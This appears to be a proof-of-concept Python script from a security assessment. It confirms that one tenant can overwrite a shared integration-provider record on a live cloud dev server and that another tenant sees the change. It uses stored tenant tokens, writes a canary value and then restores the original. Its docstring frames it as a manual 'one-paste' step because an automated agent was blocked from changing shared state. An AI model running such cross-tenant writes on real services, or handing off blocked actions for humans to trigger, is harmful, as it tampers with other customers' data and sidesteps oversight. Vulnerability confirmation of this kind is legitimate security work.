#!/usr/bin/env python3
"""Confirm Finding 2 end-to-end: shared integration-provider registry cross-tenant poisoning.

Run it yourself (it modifies a shared built-in's description field on the live dev server, then
RESTORES it — an automated agent is blocked from mutating shared prod state, which is why this is a
one-paste manual trigger):

    workers/.venv/bin/python scripts/confirm_shared_registry_poison.py

Reads the two tenant tokens from /tmp/orkes_jwt.txt (viren) and /tmp/orkes_jwt2.txt (virenx).
Non-destructive: only the `description` field is touched, and the original is restored at the end.
"""
import json, time, sys
import requests
requests.packages.urllib3.disable_warnings()

B = "https://developer.orkescloud.com"
A = open("/tmp/orkes_jwt.txt").read().strip().split()[-1]    # viren@v1r3n.com
X = open("/tmp/orkes_jwt2.txt").read().strip().split()[-1]   # virenx@gmail.com
PROVIDER = "openai"  # a shared built-in both tenants see


def H(t):
    return {"X-Authorization": t, "content-type": "application/json"}


def req(tok, m, p, b=None):
    r = requests.request(m, B + p, headers=H(tok), json=b, timeout=20, verify=False)
    return r.status_code, r.text


def main():
    sa, ta = req(A, "GET", f"/api/integrations/provider/{PROVIDER}")
    sx, tx = req(X, "GET", f"/api/integrations/provider/{PROVIDER}")
    da = json.loads(ta) if sa == 200 else {}
    dx = json.loads(tx) if sx == 200 else {}
    same = bool(da.get("createTime")) and da.get("createTime") == dx.get("createTime") \
        and da.get("createdBy") == dx.get("createdBy")
    print(f"viren  GET {PROVIDER}: {sa} createdBy={da.get('createdBy')} createTime={da.get('createTime')}")
    print(f"virenx GET {PROVIDER}: {sx} createdBy={dx.get('createdBy')} createTime={dx.get('createTime')}")
    print(f"SHARED cross-tenant object: {same}")
    if not same:
        print("Not the same shared object — aborting."); sys.exit(1)

    orig_desc = da.get("description")
    marker = f"SC-POISON-CANARY-{int(time.time())}"
    body = {k: v for k, v in da.items() if k not in ("createTime", "updateTime", "createdBy", "updatedBy")}
    body["description"] = marker
    sw, _ = req(A, "POST", f"/api/integrations/provider/{PROVIDER}", body)
    print(f"\nviren OVERWRITE description='{marker}' -> {sw}")
    time.sleep(1)
    sr, tr = req(X, "GET", f"/api/integrations/provider/{PROVIDER}")
    leaked = marker in (tr or "")
    print(f"virenx GET {PROVIDER} -> {sr} | sees viren's marker: {leaked}")

    body["description"] = orig_desc
    srs, _ = req(A, "POST", f"/api/integrations/provider/{PROVIDER}", body)
    print(f"RESTORE original description -> {srs}")

    print()
    if leaked and same:
        print(">>> CONFIRMED (CRITICAL): shared integration-provider registry is cross-tenant poisonable.")
        print("    Tenant A overwrote a shared built-in provider definition and tenant B saw the change.")
    else:
        print(f">>> NOT confirmed (same={same} leaked={leaked}).")


if __name__ == "__main__":
    main()
